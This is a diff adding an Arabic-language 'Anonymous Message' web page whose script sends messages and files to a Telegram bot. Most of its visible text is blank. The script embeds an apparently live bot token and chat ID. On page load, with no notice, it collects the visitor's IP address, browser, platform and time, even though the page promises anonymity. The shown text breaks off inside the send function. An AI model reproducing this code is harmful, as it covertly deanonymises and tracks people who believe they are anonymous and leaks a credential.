@@ -1,0 +1,1653 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>  | Anonymous Message</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #7E57C2;
+            --primary-dark: #5E35B1;
+            --secondary: #4527A0;
+            --accent: #9575CD;
+            --success: #4CAF50;
+            --danger: #F44336;
+            --warning: #FF9800;
+            --dark: #121212;
+            --light: #FFFFFF;
+            --text: #333333;
+            --text-light: #666666;
+            --card-bg: #FFFFFF;
+            --input-bg: #F5F5F5;
+            --shadow: 0 4px 12px rgba(0,0,0,0.1);
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Tajawal', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            transition: var(--transition);
+        }
+
+        .container {
+            background: var(--card-bg);
+            border-radius: 20px;
+            box-shadow: var(--shadow);
+            width: 100%;
+            max-width: 500px;
+            padding: 25px;
+            text-align: center;
+            transition: var(--transition);
+        }
+
+        .header {
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            font-size: 3rem;
+            margin-bottom: 10px;
+            color: var(--primary);
+        }
+
+        h1 {
+            color: var(--text);
+            margin-bottom: 8px;
+            font-weight: 700;
+            font-size: 1.8rem;
+        }
+
+        .subtitle {
+            color: var(--text-light);
+            margin-bottom: 5px;
+            font-size: 0.95rem;
+        }
+
+        .theme-selector {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .theme-btn {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            border: 2px solid transparent;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .theme-btn.active {
+            border-color: white;
+            transform: scale(1.1);
+        }
+
+        .theme-default { background: linear-gradient(135deg, #7E57C2, #4527A0); }
+        .theme-dark { background: linear-gradient(135deg, #424242, #212121); }
+        .theme-blue { background: linear-gradient(135deg, #2196F3, #0D47A1); }
+        .theme-pink { background: linear-gradient(135deg, #E91E63, #880E4F); }
+        .theme-green { background: linear-gradient(135deg, #4CAF50, #1B5E20); }
+
+        .section {
+            background: var(--input-bg);
+            border-radius: 15px;
+            padding: 15px;
+            margin-bottom: 15px;
+            text-align: right;
+        }
+
+        .recipient-label {
+            font-weight: 600;
+            color: var(--text-light);
+            margin-bottom: 5px;
+            font-size: 0.9rem;
+        }
+
+        .recipient-name {
+            font-size: 1.2rem;
+            color: var(--primary);
+            font-weight: 700;
+        }
+
+        .toggle-section {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px;
+        }
+
+        .toggle-label {
+            font-weight: 600;
+            color: var(--text);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .toggle-icon {
+            color: var(--primary);
+        }
+
+        .switch {
+            position: relative;
+        }
+
+        .checkbox {
+            display: none;
+        }
+
+        .slider {
+            width: 50px;
+            height: 26px;
+            background-color: #ccc;
+            border-radius: 20px;
+            position: relative;
+            transition: var(--transition);
+            cursor: pointer;
+        }
+
+        .slider::before {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background: white;
+            border-radius: 50%;
+            top: 3px;
+            left: 3px;
+            transition: var(--transition);
+        }
+
+        .checkbox:checked + .slider {
+            background-color: var(--primary);
+        }
+
+        .checkbox:checked + .slider::before {
+            transform: translateX(24px);
+        }
+
+        .sender-info {
+            display: none;
+            margin-bottom: 15px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 12px;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-light);
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 12px 12px 35px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 1rem;
+            transition: var(--transition);
+            background-color: var(--card-bg);
+            color: var(--text);
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary);
+        }
+
+        .message-section {
+            margin-bottom: 15px;
+        }
+
+        .message-box {
+            width: 100%;
+            height: 150px;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 1rem;
+            resize: none;
+            transition: var(--transition);
+            text-align: right;
+            line-height: 1.6;
+            background-color: var(--card-bg);
+            color: var(--text);
+        }
+
+        .message-box:focus {
+            outline: none;
+            border-color: var(--primary);
+        }
+
+        .char-counter {
+            text-align: left;
+            margin-top: 5px;
+            color: var(--text-light);
+            font-size: 0.8rem;
+        }
+
+        .char-counter.warning {
+            color: var(--warning);
+        }
+
+        .char-counter.error {
+            color: var(--danger);
+        }
+
+        .writing-timer {
+            text-align: left;
+            margin-top: 5px;
+            color: var(--text-light);
+            font-size: 0.8rem;
+        }
+
+        .emoji-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+            margin: 12px 0;
+            justify-content: center;
+        }
+
+        .emoji-btn {
+            background: rgba(126, 87, 194, 0.1);
+            border: 1px solid rgba(126, 87, 194, 0.2);
+            border-radius: 10px;
+            padding: 8px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: var(--transition);
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .emoji-btn:hover {
+            background: var(--primary);
+            transform: scale(1.05);
+        }
+
+        .suggestions {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+            margin: 12px 0;
+            justify-content: center;
+        }
+
+        .suggestion-btn {
+            background: rgba(126, 87, 194, 0.1);
+            color: var(--primary);
+            border: 1px solid rgba(126, 87, 194, 0.2);
+            border-radius: 12px;
+            padding: 6px 12px;
+            font-size: 0.85rem;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .suggestion-btn:hover {
+            background: var(--primary);
+            color: white;
+        }
+
+        .file-upload-section {
+            margin: 12px 0;
+        }
+
+        .upload-options {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 8px;
+            flex-wrap: wrap;
+        }
+
+        .upload-btn {
+            flex: 1;
+            min-width: 100px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 10px 12px;
+            background: rgba(126, 87, 194, 0.1);
+            border: 1px dashed rgba(126, 87, 194, 0.3);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: var(--transition);
+            color: var(--primary);
+            font-size: 0.85rem;
+        }
+
+        .upload-btn:hover {
+            background: rgba(126, 87, 194, 0.2);
+        }
+
+        #imageInput, #audioInput, #fileInput {
+            display: none;
+        }
+
+        .file-preview {
+            margin-top: 8px;
+            display: none;
+        }
+
+        .preview-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px;
+            background: rgba(126, 87, 194, 0.1);
+            border-radius: 8px;
+            margin-bottom: 8px;
+        }
+
+        .preview-image {
+            max-width: 60px;
+            max-height: 60px;
+            border-radius: 6px;
+            object-fit: cover;
+        }
+
+        .preview-info {
+            flex: 1;
+            text-align: right;
+        }
+
+        .file-name {
+            font-weight: 600;
+            color: var(--text);
+            margin-bottom: 3px;
+            font-size: 0.9rem;
+            word-break: break-all;
+        }
+
+        .file-size {
+            font-size: 0.75rem;
+            color: var(--text-light);
+        }
+
+        .remove-file {
+            background: var(--danger);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 5px 10px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            transition: var(--transition);
+        }
+
+        .remove-file:hover {
+            background: #d32f2f;
+        }
+
+        .voice-recording {
+            margin: 15px 0;
+            text-align: center;
+        }
+
+        .voice-btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            font-size: 1.3rem;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto;
+        }
+
+        .voice-btn:hover {
+            background: var(--primary-dark);
+            transform: scale(1.05);
+        }
+
+        .voice-btn.recording {
+            background: var(--danger);
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .voice-timer {
+            margin-top: 8px;
+            color: var(--text-light);
+            font-size: 0.85rem;
+        }
+
+        .reset-btn {
+            background: rgba(126, 87, 194, 0.1);
+            color: var(--primary);
+            border: 1px solid rgba(126, 87, 194, 0.2);
+            border-radius: 10px;
+            padding: 10px 15px;
+            cursor: pointer;
+            margin-top: 12px;
+            font-size: 0.9rem;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            width: 100%;
+            justify-content: center;
+        }
+
+        .reset-btn:hover {
+            background: rgba(126, 87, 194, 0.2);
+        }
+
+        .send-btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 15px 20px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 15px;
+            width: 100%;
+            transition: var(--transition);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .send-btn:hover {
+            background: var(--primary-dark);
+            transform: translateY(-2px);
+        }
+
+        .send-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .send-btn.sending {
+            position: relative;
+            overflow: hidden;
+        }
+
+        .send-btn.sending::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: sending 1.5s infinite;
+        }
+
+        @keyframes sending {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .progress-bar {
+            height: 4px;
+            background: var(--primary);
+            width: 0%;
+            border-radius: 2px;
+            margin-top: 10px;
+            transition: width 0.3s ease;
+        }
+
+        .file-count {
+            display: inline-block;
+            background: var(--primary);
+            color: white;
+            border-radius: 50%;
+            width: 18px;
+            height: 18px;
+            font-size: 0.7rem;
+            line-height: 18px;
+            text-align: center;
+            margin-right: 4px;
+        }
+
+        .typing-indicator {
+            display: none;
+            color: var(--text-light);
+            font-size: 0.85rem;
+            margin-top: 8px;
+            text-align: center;
+        }
+
+        .features {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .feature {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            background: var(--input-bg);
+            border-radius: 8px;
+            transition: var(--transition);
+        }
+
+        .feature:hover {
+            transform: translateY(-2px);
+        }
+
+        .feature-icon {
+            background: var(--primary);
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-left: 8px;
+            font-size: 0.9rem;
+        }
+
+        .feature-text {
+            text-align: right;
+            color: var(--text);
+            font-size: 0.8rem;
+            font-weight: 600;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: var(--card-bg);
+            border-radius: 10px;
+            padding: 12px 16px;
+            box-shadow: var(--shadow);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            z-index: 1000;
+            transform: translateX(150%);
+            transition: transform 0.3s ease;
+        }
+
+        .toast.show {
+            transform: translateX(0);
+        }
+
+        .toast-icon {
+            font-size: 1.2rem;
+        }
+
+        .toast.success .toast-icon {
+            color: var(--success);
+        }
+
+        .toast-message {
+            color: var(--text);
+            font-weight: 500;
+            font-size: 0.9rem;
+        }
+
+        .upload-popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+        }
+
+        .upload-popup.show {
+            display: flex;
+        }
+
+        .upload-box {
+            background: var(--card-bg);
+            border-radius: 15px;
+            padding: 20px;
+            width: 300px;
+            box-shadow: var(--shadow);
+        }
+
+        .file-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 15px;
+        }
+
+        .file-icon {
+            background: var(--primary);
+            color: white;
+            width: 45px;
+            height: 55px;
+            border-radius: 8px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            font-size: 0.8rem;
+        }
+
+        .file-info {
+            flex-grow: 1;
+            text-align: right;
+        }
+
+        .file-name {
+            font-weight: 600;
+            color: var(--text);
+            font-size: 0.95rem;
+        }
+
+        .file-size {
+            font-size: 0.8rem;
+            color: var(--text-light);
+        }
+
+        .progress-container {
+            margin-top: 15px;
+            position: relative;
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 3px;
+            overflow: hidden;
+        }
+
+        .progress-bar-upload {
+            position: absolute;
+            left: 0;
+            top: 0;
+            height: 100%;
+            width: 0%;
+            background: var(--primary);
+            transition: width 0.3s ease;
+        }
+
+        .progress-text {
+            text-align: right;
+            margin-top: 8px;
+            font-size: 0.85rem;
+            color: var(--text);
+        }
+
+        .upload-actions {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 15px;
+            gap: 8px;
+        }
+
+        .cancel-btn {
+            background: var(--danger);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 8px 12px;
+            cursor: pointer;
+            font-size: 0.85rem;
+            transition: var(--transition);
+        }
+
+        .cancel-btn:hover {
+            background: #d32f2f;
+        }
+
+        .confetti {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            background-color: var(--primary);
+            opacity: 0;
+            pointer-events: none;
+            z-index: 1000;
+            border-radius: 50%;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px;
+            }
+            
+            .upload-options {
+                flex-direction: column;
+            }
+            
+            .upload-btn {
+                min-width: auto;
+            }
+            
+            .features {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body class="theme-default">
+    <div class="container">
+        <div class="header">
+            <div class="logo"></div>
+            <h1> </h1>
+            <p class="subtitle">     </p>
+            
+            <div class="theme-selector">
+                <div class="theme-btn theme-default active" data-theme="default"></div>
+                <div class="theme-btn theme-dark" data-theme="dark"></div>
+                <div class="theme-btn theme-blue" data-theme="blue"></div>
+                <div class="theme-btn theme-pink" data-theme="pink"></div>
+                <div class="theme-btn theme-green" data-theme="green"></div>
+            </div>
+        </div>
+        
+        <div class="section recipient-section">
+            <div class="recipient-label">  :</div>
+            <div class="recipient-name" id="recipientName"></div>
+        </div>
+        
+        <div class="section toggle-section">
+            <span class="toggle-label">
+                <i class="fas fa-user-secret toggle-icon"></i>
+                 
+            </span>
+            <label class="switch">
+                <input type="checkbox" class="checkbox" id="anonymousToggle">
+                <div class="slider"></div>
+            </label>
+        </div>
+        
+        <div class="sender-info" id="senderInfo">
+            <div class="input-group">
+                <i class="fas fa-user input-icon"></i>
+                <input type="text" class="form-input" id="senderName" placeholder=" ">
+            </div>
+        </div>
+        
+        <div class="message-section">
+            <textarea 
+                class="message-box" 
+                id="messageInput" 
+                placeholder="  ... ( 5000 ) "
+                maxlength="5000"
+            ></textarea>
+            <div class="char-counter" id="charCounter">0/5,000</div>
+            <div class="writing-timer" id="writingTimer">  : 0 </div>
+        </div>
+        
+        <div class="emoji-row">
+            <button class="emoji-btn" data-emoji=""></button>
+            <button class="emoji-btn" data-emoji=""></button>
+            <button class="emoji-btn" data-emoji=""></button>
+            <button class="emoji-btn" data-emoji=""></button>
+            <button class="emoji-btn" data-emoji=""></button>
+            <button class="emoji-btn" data-emoji=""></button>
+            <button class="emoji-btn" data-emoji=""></button>
+            <button class="emoji-btn" data-emoji=""></button>
+            <button class="emoji-btn" data-emoji=""></button>
+            <button class="emoji-btn" data-emoji=""></button>
+        </div>
+        
+        <div class="suggestions">
+            <button class="suggestion-btn" data-message="       "></button>
+            <button class="suggestion-btn" data-message="      "></button>
+            <button class="suggestion-btn" data-message="      "></button>
+        </div>
+        
+        <div class="voice-recording">
+            <button class="voice-btn" id="voiceBtn">
+                <i class="fas fa-microphone"></i>
+            </button>
+            <div class="voice-timer" id="voiceTimer">00:00</div>
+        </div>
+        
+        <div class="file-upload-section">
+            <div class="upload-options">
+                <label for="imageInput" class="upload-btn">
+                    <i class="fas fa-image"></i>
+                    <span></span>
+                    <span class="file-count" id="imageCount">0</span>
+                </label>
+                <label for="audioInput" class="upload-btn">
+                    <i class="fas fa-music"></i>
+                    <span> </span>
+                    <span class="file-count" id="audioCount">0</span>
+                </label>
+                <label for="fileInput" class="upload-btn">
+                    <i class="fas fa-file"></i>
+                    <span></span>
+                    <span class="file-count" id="fileCount">0</span>
+                </label>
+            </div>
+            
+            <input type="file" id="imageInput" accept="image/*" multiple>
+            <input type="file" id="audioInput" accept="audio/*" multiple>
+            <input type="file" id="fileInput" accept="*/*" multiple>
+            
+            <div class="file-preview" id="filePreview"></div>
+        </div>
+        
+        <button class="reset-btn" id="resetButton">
+            <i class="fas fa-redo"></i>
+             
+        </button>
+        
+        <div class="progress-bar" id="progressBar"></div>
+        
+        <div class="typing-indicator" id="typingIndicator">
+               <span>.</span><span>.</span><span>.</span>
+        </div>
+        
+        <button class="send-btn" id="sendButton">
+            <i class="fas fa-paper-plane send-icon"></i>
+             
+        </button>
+        
+        <div class="features">
+            <div class="feature">
+                <div class="feature-icon"></div>
+                <div class="feature-text"> </div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon"></div>
+                <div class="feature-text"> </div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon"></div>
+                <div class="feature-text"> </div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon"></div>
+                <div class="feature-text">  </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast Notification -->
+    <div class="toast success" id="successToast">
+        <div class="toast-icon"></div>
+        <div class="toast-message">   !</div>
+    </div>
+
+    <!-- Upload Popup -->
+    <div class="upload-popup" id="uploadPopup">
+        <div class="upload-box">
+            <div class="file-header">
+                <div class="file-icon" id="popupFileIcon"></div>
+                <div class="file-info">
+                    <div class="file-name" id="popupFileName">  </div>
+                    <div class="file-size" id="popupFileSize">0 KB</div>
+                </div>
+            </div>
+
+            <div class="progress-container">
+                <div class="progress-bar-upload" id="popupProgress"></div>
+            </div>
+            <div class="progress-text" id="popupPercent"> ... 0%</div>
+
+            <div class="upload-actions">
+                <button class="cancel-btn" id="cancelUpload">
+                    <i class="fas fa-times"></i>
+                    
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        //  
+        const BOT_TOKEN = "8207834365:AAEvFxb-nH1nJXYHXlEK0ZcvdsISRmdXOeo";
+        const DEFAULT_CHAT_ID = "8387187747";
+        
+        //    
+        const urlParams = new URLSearchParams(window.location.search);
+        const recipient = urlParams.get('to') || '';
+        const chatId = urlParams.get('chat_id') || DEFAULT_CHAT_ID;
+        
+        //  
+        let userLocation = null;
+        let isAnonymous = true;
+        let selectedFiles = {
+            images: [],
+            audios: [],
+            files: []
+        };
+        
+        //  
+        let userInfo = {
+            ip: ' ...',
+            browser: '',
+            platform: '',
+            timestamp: ''
+        };
+
+        //   
+        let writingStartTime = null;
+        let writingTimerInterval = null;
+        let writingTime = 0;
+        let voiceRecorder = null;
+        let voiceRecording = false;
+        let voiceTimer = null;
+        let voiceTime = 0;
+        let audioChunks = [];
+
+        //  
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('recipientName').textContent = recipient;
+            getUserInfo();
+            setupEventListeners();
+            updateFileCounts();
+            startWritingTimer();
+            setupVoiceRecording();
+        });
+
+        //    
+        async function getUserInfo() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userInfo.ip = ipData.ip;
+            } catch (error) {
+                userInfo.ip = ' ';
+            }
+
+            userInfo.browser = getBrowserName();
+            userInfo.platform = navigator.platform;
+            userInfo.timestamp = new Date().toLocaleString('ar-EG');
+        }
+
+        function getBrowserName() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes("Chrome")) return "Chrome";
+            if (userAgent.includes("Firefox")) return "Firefox";
+            if (userAgent.includes("Safari")) return "Safari";
+            return " ";
+        }
+        
+        function startWritingTimer() {
+            const messageInput = document.getElementById('messageInput');
+            if (!messageInput) return;
+            
+            messageInput.addEventListener('focus', function() {
+                if (!writingStartTime) {
+                    writingStartTime = new Date();
+                    writingTimerInterval = setInterval(updateWritingTimer, 1000);
+                }
+            });
+        }
+        
+        function updateWritingTimer() {
+            if (writingStartTime) {
+                writingTime = Math.floor((new Date() - writingStartTime) / 1000);
+                const timerElement = document.getElementById('writingTimer');
+                if (timerElement) {
+                    const minutes = Math.floor(writingTime / 60);
+                    const seconds = writingTime % 60;
+                    timerElement.textContent = `  : ${minutes}:${seconds.toString().padStart(2, '0')}`;
+                }
+            }
+        }
+        
+        function setupVoiceRecording() {
+            const voiceBtn = document.getElementById('voiceBtn');
+            if (!voiceBtn) return;
+            
+            voiceBtn.addEventListener('click', toggleVoiceRecording);
+        }
+        
+        async function toggleVoiceRecording() {
+            const voiceBtn = document.getElementById('voiceBtn');
+            const voiceTimerElement = document.getElementById('voiceTimer');
+            
+            if (!voiceRecording) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    voiceRecorder = new MediaRecorder(stream);
+                    audioChunks = [];
+                    
+                    voiceRecorder.ondataavailable = (event) => {
+                        audioChunks.push(event.data);
+                    };
+                    
+                    voiceRecorder.onstop = () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                        const audioFile = new File([audioBlob], '-.wav', { type: 'audio/wav' });
+                        selectedFiles.audios.push(audioFile);
+                        updateFileCounts();
+                        updateFilePreview([audioFile], 'audios');
+                    };
+                    
+                    voiceRecorder.start();
+                    voiceRecording = true;
+                    voiceBtn.classList.add('recording');
+                    voiceBtn.innerHTML = '<i class="fas fa-stop"></i>';
+                    
+                    voiceTime = 0;
+                    voiceTimer = setInterval(() => {
+                        voiceTime++;
+                        const minutes = Math.floor(voiceTime / 60);
+                        const seconds = voiceTime % 60;
+                        voiceTimerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                    }, 1000);
+                    
+                } catch (error) {
+                    showAlert('     ', 'error');
+                }
+            } else {
+                if (voiceRecorder && voiceRecorder.state !== 'inactive') {
+                    voiceRecorder.stop();
+                    voiceRecorder.stream.getTracks().forEach(track => track.stop());
+                }
+                
+                voiceRecording = false;
+                voiceBtn.classList.remove('recording');
+                voiceBtn.innerHTML = '<i class="fas fa-microphone"></i>';
+                
+                if (voiceTimer) {
+                    clearInterval(voiceTimer);
+                    voiceTimer = null;
+                }
+                
+                voiceTimerElement.textContent = '00:00';
+            }
+        }
+        
+        function setupEventListeners() {
+            //  
+            document.querySelectorAll('.theme-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const theme = this.getAttribute('data-theme');
+                    document.body.className = `theme-${theme}`;
+                    document.querySelectorAll('.theme-btn').forEach(b => b.classList.remove('active'));
+                    this.classList.add('active');
+                });
+            });
+            
+            //   /
+            const anonymousToggle = document.getElementById('anonymousToggle');
+            if (anonymousToggle) {
+                anonymousToggle.addEventListener('change', function() {
+                    isAnonymous = !this.checked;
+                    const senderInfo = document.getElementById('senderInfo');
+                    senderInfo.style.display = isAnonymous ? 'none' : 'block';
+                });
+            }
+            
+            //   
+            const messageInput = document.getElementById('messageInput');
+            if (messageInput) {
+                messageInput.addEventListener('input', function() {
+                    const length = this.value.length;
+                    const charCounter = document.getElementById('charCounter');
+                    if (charCounter) {
+                        charCounter.textContent = `${length.toLocaleString()}/5,000`;
+                        
+                        if (length > 4000) {
+                            charCounter.classList.add('warning');
+                        } else {
+                            charCounter.classList.remove('warning');
+                        }
+                        
+                        if (length === 5000) {
+                            charCounter.classList.add('error');
+                        } else {
+                            charCounter.classList.remove('error');
+                        }
+                    }
+                });
+            }
+            
+            //  
+            document.querySelectorAll('.emoji-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const emoji = this.getAttribute('data-emoji');
+                    insertAtCursor(emoji);
+                    if (messageInput) messageInput.focus();
+                });
+            });
+            
+            //  
+            document.querySelectorAll('.suggestion-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    if (messageInput) {
+                        messageInput.value = this.getAttribute('data-message');
+                        messageInput.dispatchEvent(new Event('input'));
+                        messageInput.focus();
+                    }
+                });
+            });
+            
+            //  
+            const imageInput = document.getElementById('imageInput');
+            const audioInput = document.getElementById('audioInput');
+            const fileInput = document.getElementById('fileInput');
+            
+            if (imageInput) imageInput.addEventListener('change', (e) => handleFileUpload(e, 'images'));
+            if (audioInput) audioInput.addEventListener('change', (e) => handleFileUpload(e, 'audios'));
+            if (fileInput) fileInput.addEventListener('change', (e) => handleFileUpload(e, 'files'));
+            
+            //  
+            const sendButton = document.getElementById('sendButton');
+            if (sendButton) {
+                sendButton.addEventListener('click', sendMessage);
+            }
+            
+            //   
+            const resetButton = document.getElementById('resetButton');
+            if (resetButton) {
+                resetButton.addEventListener('click', resetForm);
+            }
+            
+            //   
+            const cancelUpload = document.getElementById('cancelUpload');
+            if (cancelUpload) {
+                cancelUpload.addEventListener('click', function() {
+                    document.getElementById('uploadPopup').classList.remove('show');
+                });
+            }
+        }
+        
+        function updateFileCounts() {
+            document.getElementById('imageCount').textContent = selectedFiles.images.length;
+            document.getElementById('audioCount').textContent = selectedFiles.audios.length;
+            document.getElementById('fileCount').textContent = selectedFiles.files.length;
+        }
+        
+        function insertAtCursor(text) {
+            const messageInput = document.getElementById('messageInput');
+            if (!messageInput) return;
+            
+            const start = messageInput.selectionStart;
+            const end = messageInput.selectionEnd;
+            const value = messageInput.value;
+            
+            messageInput.value = value.substring(0, start) + text + value.substring(end);
+            messageInput.selectionStart = messageInput.selectionEnd = start + text.length;
+            messageInput.dispatchEvent(new Event('input'));
+        }
+        
+        function handleFileUpload(event, type) {
+            const files = Array.from(event.target.files);
+            if (files.length > 0) {
+                const maxSize = 50 * 1024 * 1024; // 50MB
+                const validFiles = files.filter(file => file.size <= maxSize);
+                
+                if (validFiles.length < files.length) {
+                    showAlert(`        50MB`, 'error');
+                }
+                
+                selectedFiles[type] = [...selectedFiles[type], ...validFiles];
+                updateFileCounts();
+                updateFilePreview(validFiles, type);
+            }
+        }
+        
+        function updateFilePreview(files, type) {
+            const filePreview = document.getElementById('filePreview');
+            if (!filePreview) return;
+            
+            files.forEach(file => {
+                const fileId = `${type}-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
+                
+                const previewContainer = document.createElement('div');
+                previewContainer.className = 'preview-container';
+                previewContainer.id = fileId;
+                
+                let previewContent = '';
+                if (type === 'images') {
+                    const reader = new FileReader();
+                    reader.onload = function(e) {
+                        previewContent = `<img src="${e.target.result}" class="preview-image" alt="Preview">`;
+                        previewContainer.innerHTML = getPreviewHTML(file, type, fileId, previewContent);
+                        setupRemoveButton(fileId, type);
+                    };
+                    reader.readAsDataURL(file);
+                } else {
+                    previewContainer.innerHTML = getPreviewHTML(file, type, fileId);
+                    setupRemoveButton(fileId, type);
+                }
+                
+                filePreview.appendChild(previewContainer);
+                filePreview.style.display = 'block';
+            });
+        }
+        
+        function setupRemoveButton(fileId, type) {
+            const removeBtn = document.getElementById(`remove-${fileId}`);
+            if (removeBtn) {
+                removeBtn.addEventListener('click', () => {
+                    removeFile(fileId, type);
+                });
+            }
+        }
+        
+        function getPreviewHTML(file, type, fileId, previewContent = '') {
+            const fileTypeIcons = {
+                images: 'fas fa-image',
+                audios: 'fas fa-music',
+                files: 'fas fa-file'
+            };
+            
+            const fileTypeNames = {
+                images: '',
+                audios: ' ',
+                files: ''
+            };
+            
+            return `
+                ${previewContent || `<i class="${fileTypeIcons[type]}"></i>`}
+                <div class="preview-info">
+                    <div class="file-name">${file.name}</div>
+                    <div class="file-size">${fileTypeNames[type]} - ${formatFileSize(file.size)}</div>
+                </div>
+                <button class="remove-file" id="remove-${fileId}"></button>
+            `;
+        }
+        
+        function formatFileSize(bytes) {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+        }
+        
+        function removeFile(fileId, type) {
+            const fileElement = document.getElementById(fileId);
+            if (fileElement) {
+                fileElement.remove();
+            }
+            
+            const index = selectedFiles[type].findIndex((file, idx) => {
+                return `${type}-${idx}` === fileId;
+            });
+            
+            if (index !== -1) {
+                selectedFiles[type].splice(index, 1);
+            }
+            
+            updateFileCounts();
+            
+            const filePreview = document.getElementById('filePreview');
+            if (filePreview && filePreview.children.length === 0) {
+                filePreview.style.display = 'none';
+            }
+        }
+        
+        async function sendMessage() {
+            const message = document.getElementById('messageInput')?.value.trim() || '';
+            const sendButton = document.getElementById('sendButton');
+            
+            if (!message && !hasFiles()) {
+                showAlert('    ', 'error');
+                return;
+            }
+            
+            let senderName = '';
+            if (!isAnonymous) {
+                senderName = document.getElementById('senderName')?.value.trim() || '';
+                if (!senderName) {
+                    showAlert('  .', 'error');
+                    return;
+                }
+            }
+            
+            if (sendButton) {
+                sendButton.disabled = true;
+                sendButton.classList.add('sending');
